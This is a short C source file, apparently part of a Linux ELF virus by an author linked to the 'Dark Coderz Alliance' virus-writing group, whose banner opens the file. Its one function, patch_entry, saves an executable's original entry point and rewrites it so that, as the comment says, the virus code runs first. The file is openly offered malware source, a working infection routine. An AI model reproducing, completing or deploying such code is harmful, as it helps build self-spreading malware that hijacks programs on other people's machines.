/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/

/* 
    Description : ehdr->e_entry ( entry point) will be patched so that our virus
                  code will be executed first.Therefore we need to patch e_entry
		  to jump to the beginning of our virus ( in our case after the code
		  segment)
*/

#include "../defines.h"

int patch_entry(Infect *file)
{
	/* saving original entry point */
	file->origin_entry=file->mmap.ehdr->e_entry;
	
	/* patch old e_entry */
	file->mmap.ehdr->e_entry=ALIGN_UP(file->phdr_code->p_vaddr+file->phdr_code->p_filesz);
	printf("__ [ patch _ entry ] __\n");
	printf("old e_entry = %p\n",file->origin_entry);
	printf("new e_entry = %p\n\n",file->mmap.ehdr->e_entry);
	
	return true;
}
